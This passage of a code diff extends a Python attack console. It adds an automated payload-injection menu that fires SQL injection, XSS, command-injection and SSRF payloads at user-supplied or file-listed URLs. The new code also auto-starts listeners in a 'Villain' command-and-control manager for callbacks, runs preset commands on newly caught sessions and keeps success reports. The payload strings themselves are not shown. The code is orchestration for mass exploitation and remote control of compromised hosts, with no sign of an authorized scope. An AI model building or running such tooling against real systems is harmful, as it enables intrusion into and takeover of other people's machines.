+        return any(error in content for error in [
+            'error', 'exception', 'warning', 'fatal'
+        ])
+        
+    def _display_standalone_results(self, results):
+        """Display results from standalone injection"""
+        if not results:
+            self.console.print("[yellow]No results to display[/yellow]")
+            return
+            
+        successful = [r for r in results if r['success']]
+        
+        # Summary table
+        table = Table(title="Standalone Injection Results")
+        table.add_column("Target", style="cyan")
+        table.add_column("Payload Type", style="green") 
+        table.add_column("Status", style="yellow")
+        table.add_column("Response Code", style="white")
+        
+        for result in results:
+            status = "✓ Success" if result['success'] else "✗ Failed"
+            status_style = "green" if result['success'] else "red"
+            
+            table.add_row(
+                result['url'][:50] + "..." if len(result['url']) > 50 else result['url'],
+                result['payload_type'],
+                f"[{status_style}]{status}[/{status_style}]",
+                str(result.get('status_code', 'N/A'))
+            )
+            
+        self.console.print(table)
+        
+        # Summary statistics
+        self.console.print(f"\n[bold cyan]Summary:[/bold cyan]")
+        self.console.print(f"Total tests: {len(results)}")
+        self.console.print(f"Successful: {len(successful)}")
+        self.console.print(f"Success rate: {len(successful)/len(results)*100:.1f}%" if results else "0%")
+        
+        # Show successful findings
+        if successful:
+            self.console.print(f"\n[bold green]Successful Injections:[/bold green]")
+            for result in successful:
+                self.console.print(f"  • {result['payload_type']} on {result['url']}")
+                self.console.print(f"    Payload: {result['payload'][:100]}...")
+                
+        # Offer to save results
+        if Confirm.ask("Save results to file?", default=True):
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            filename = f"standalone_injection_results_{timestamp}.json"
+            
+            try:
+                with open(filename, 'w') as f:
+                    json.dump(results, f, indent=2)
+                self.console.print(f"[green]Results saved to {filename}[/green]")
+            except Exception as e:
+                self.console.print(f"[red]Error saving results: {e}[/red]")
                 
     def target_discovery(self):
         """Perform target discovery"""
@@ -3598,10 +4565,14 @@ YSSY      YSSP~YSSY    SSS~YSSY      Y~YSSY    YSSP  SSS     S*S    YSSP  S*S   
             villain_menu.add("[5] Execute Command on Session")
             villain_menu.add("[6] View Evidence")
             villain_menu.add("[7] Stop Listener")
-            villain_menu.add("[8] Back to Main Menu")
+            villain_menu.add("[8] 🚀 Auto Payload Injection")
+            villain_menu.add("[9] 📊 Automation Status")
+            villain_menu.add("[10] ⚙️ Configure Automation")
+            villain_menu.add("[11] 📈 View Success Reports")
+            villain_menu.add("[12] Back to Main Menu")
             self.console.print(villain_menu)
             
-            choice = Prompt.ask("Select option", choices=["1", "2", "3", "4", "5", "6", "7", "8"])
+            choice = Prompt.ask("Select option", choices=["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12"])
             
             if choice == "1":
                 self._start_listener()
@@ -3618,6 +4589,14 @@ YSSY      YSSP~YSSY    SSS~YSSY      Y~YSSY    YSSP  SSS     S*S    YSSP  S*S   
             elif choice == "7":
                 self._stop_listener()
             elif choice == "8":
+                self._auto_payload_injection()
+            elif choice == "9":
+                self._view_automation_status()
+            elif choice == "10":
+                self._configure_automation()
+            elif choice == "11":
+                self._view_success_reports()
+            elif choice == "12":
                 break
                 
     def _start_listener(self):
@@ -4171,6 +5150,226 @@ YSSY      YSSP~YSSY    SSS~YSSY      Y~YSSY    YSSP  SSS     S*S    YSSP  S*S   
             sessions = self.villain_manager.get_active_sessions()
             if sessions:
                 self.console.print(f"\n[bold green]C2 Sessions Established: {len(sessions)}[/bold green]")
+                
+    def _auto_payload_injection(self):
+        """Automated payload injection with Villain integration"""
+        self.console.print("\n[bold blue]🚀 Automated Payload Injection[/bold blue]")
+        
+        # Get targets for injection
+        target_option = Prompt.ask(
+            "Target source",
+            choices=["url", "file", "scan_results"],
+            default="url"
+        )
+        
+        targets = []
+        if target_option == "url":
+            target_url = Prompt.ask("Enter target URL")
+            if not target_url.startswith(("http://", "https://")):
+                target_url = "http://" + target_url
+            targets = [{
+                'url': target_url,
+                'method': 'GET',
+                'injection_point': 'parameter',
+                'param_name': 'q'
+            }]
+        elif target_option == "file":
+            filename = Prompt.ask("Enter target file path")
+            try:
+                with open(filename, 'r') as f:
+                    for line in f:
+                        line = line.strip()
+                        if line and not line.startswith('#'):
+                            targets.append({
+                                'url': line,
+                                'method': 'GET',
+                                'injection_point': 'parameter',
+                                'param_name': 'q'
+                            })
+            except Exception as e:
+                self.console.print(f"[red]Error reading file: {e}[/red]")
+                return
+        
+        if not targets:
+            self.console.print("[yellow]No targets specified[/yellow]")
+            return
+            
+        # Configure injection
+        vuln_types = []
+        if Confirm.ask("Include SQL injection payloads?", default=True):
+            vuln_types.append("sql_injection")
+        if Confirm.ask("Include XSS payloads?", default=True):
+            vuln_types.append("xss")
+        if Confirm.ask("Include command injection payloads?", default=True):
+            vuln_types.append("command_injection")
+        if Confirm.ask("Include SSRF payloads?", default=False):
+            vuln_types.append("ssrf")
+            
+        auto_start_listener = Confirm.ask("Auto-start listener for callbacks?", default=True)
+        
+        # Start listener if requested
+        if auto_start_listener:
+            listeners = self.villain_manager.get_active_listeners()
+            if not listeners:
+                listener_id = self.villain_manager.start_listener()
+                if listener_id:
+                    self.console.print(f"[green]Started listener {listener_id}[/green]")
+                    
+        # Execute automated injection
+        self.console.print(f"\n[bold yellow]Starting automated injection on {len(targets)} targets...[/bold yellow]")
+        
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[progress.description]{task.description}"),
+            BarColumn(),
+            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
+        ) as progress:
+            task = progress.add_task("Injecting payloads...", total=len(targets) * len(vuln_types))
+            
+            results = self.payload_generator.auto_inject_payloads_to_targets(targets, vuln_types)
+            
+            for result in results:
+                progress.advance(task)
+                if result['success']:
+                    self.console.print(f"[green]✓ Success: {result['vulnerability_type']} -> {result['target']}[/green]")
+                    
+        # Summary
+        successful = [r for r in results if r['success']]
+        self.console.print(f"\n[bold cyan]Injection Summary:[/bold cyan]")
+        self.console.print(f"Total attempts: {len(results)}")
+        self.console.print(f"Successful: {len(successful)}")
+        self.console.print(f"Success rate: {len(successful)/len(results)*100:.1f}%" if results else "0%")
+        
+        # Show successful injections
+        if successful:
+            self.console.print("\n[bold green]Successful Injections:[/bold green]")
+            for result in successful:
+                self.console.print(f"  • {result['vulnerability_type']} on {result['target']}")
+                
+    def _view_automation_status(self):
+        """View automation system status"""
+        self.console.print("\n[bold blue]📊 Automation Status[/bold blue]")
+        
+        # Get automation status
+        status = self.villain_manager.get_automation_status()
+        
+        # Create status table
+        table = Table(title="Automation System Status")
+        table.add_column("Component", style="cyan")
+        table.add_column("Status", style="green")
+        table.add_column("Count", style="yellow")
+        
+        table.add_row("Active Sessions", "Running", str(status['active_sessions']))
+        table.add_row("Queued Injections", "Pending", str(status['queued_injections']))
+        table.add_row("Successful Payloads", "Completed", str(status['successful_payloads']))
+        table.add_row("Monitored Sessions", "Active", str(status['monitored_sessions']))
+        
+        self.console.print(table)
+        
+        # Event handlers status
+        self.console.print("\n[bold cyan]Event Handlers:[/bold cyan]")
+        for event_type, count in status['event_handlers'].items():
+            self.console.print(f"  • {event_type}: {count} handlers")
+            
+        # Payload generator statistics
+        if hasattr(self.payload_generator, 'get_injection_statistics'):
+            stats = self.payload_generator.get_injection_statistics()
+            self.console.print(f"\n[bold cyan]Payload Statistics:[/bold cyan]")
+            self.console.print(f"  • Total payloads: {stats['total_payloads']}")
+            self.console.print(f"  • Callback payloads: {stats['callback_payloads']}")
+            self.console.print(f"  • Payload categories: {stats['payload_categories']}")
+            self.console.print(f"  • Injection strategies: {stats['injection_strategies']}")
+            
+    def _configure_automation(self):
+        """Configure automation settings"""
+        self.console.print("\n[bold blue]⚙️ Automation Configuration[/bold blue]")
+        
+        # Auto-start listener setting
+        auto_start = Confirm.ask("Auto-start listener on injection?", default=True)
+        
+        # Auto-commands configuration
+        self.console.print("\n[bold cyan]Initial Commands for New Sessions:[/bold cyan]")
+        current_commands = getattr(self.villain_manager, 'auto_commands', [])
+        if current_commands:
+            for i, cmd in enumerate(current_commands):
+                self.console.print(f"  {i+1}. {cmd}")
+        else:
+            self.console.print("  [yellow]No auto-commands configured[/yellow]")
+            
+        if Confirm.ask("Modify auto-commands?", default=False):
+            self.villain_manager.auto_commands = []
+            while True:
+                command = Prompt.ask("Enter command (empty to finish)", default="")
+                if not command:
+                    break
+                self.villain_manager.auto_commands.append(command)
+                
+        # Payload delay configuration
+        current_delay = getattr(self.villain_manager, 'injection_delay', 1.0)
+        delay = Prompt.ask(f"Injection delay in seconds", default=str(current_delay))
+        try:
+            self.villain_manager.injection_delay = float(delay)
+        except ValueError:
+            self.console.print("[red]Invalid delay value[/red]")
+            
+        self.console.print("[green]Automation configuration updated[/green]")
+        
+    def _view_success_reports(self):
+        """View payload success reports"""
+        self.console.print("\n[bold blue]📈 Payload Success Reports[/bold blue]")
+        
+        reports_dir = "villain/reports"
+        if not os.path.exists(reports_dir):
+            self.console.print("[yellow]No reports directory found[/yellow]")
+            return
+            
+        report_files = [f for f in os.listdir(reports_dir) if f.endswith('.json')]
+        
+        if not report_files:
+            self.console.print("[yellow]No success reports found[/yellow]")
+            return
+            
+        # Show recent reports
+        report_files.sort(reverse=True)
+        recent_reports = report_files[:10]  # Show last 10 reports
+        
+        table = Table(title="Recent Success Reports")
+        table.add_column("Timestamp", style="cyan")
+        table.add_column("Event Type", style="green")
+        table.add_column("Target", style="yellow")
+        table.add_column("Details", style="white")
+        
+        for report_file in recent_reports:
+            try:
+                with open(os.path.join(reports_dir, report_file), 'r') as f:
+                    report = json.load(f)
+                    
+                timestamp = report.get('timestamp', 'Unknown')[:19]  # Format timestamp
+                event_type = report.get('event_type', 'Unknown')
+                target = report.get('payload_details', {}).get('target', 'Unknown')
+                payload_type = report.get('payload_details', {}).get('type', 'Unknown')
+                
+                table.add_row(timestamp, event_type, target, payload_type)
+                
+            except Exception as e:
+                self.console.print(f"[red]Error reading report {report_file}: {e}[/red]")
+                
+        self.console.print(table)
+        
+        # Show payload success log
+        if hasattr(self.villain_manager, 'payload_success_log'):
+            success_log = self.villain_manager.payload_success_log
+            if success_log:
+                self.console.print(f"\n[bold cyan]Total Successful Payloads: {len(success_log)}[/bold cyan]")
+                
+                # Group by payload type
+                type_counts = {}
+                for entry in success_log:
+                    payload_type = entry.get('payload_type', 'Unknown')
+                    type_counts[payload_type] = type_counts.get(payload_type, 0) + 1
+                    
+                for payload_type, count in type_counts.items():
+                    self.console.print(f"  • {payload_type}: {count}")
 
 def main():
     """Main execution function"""
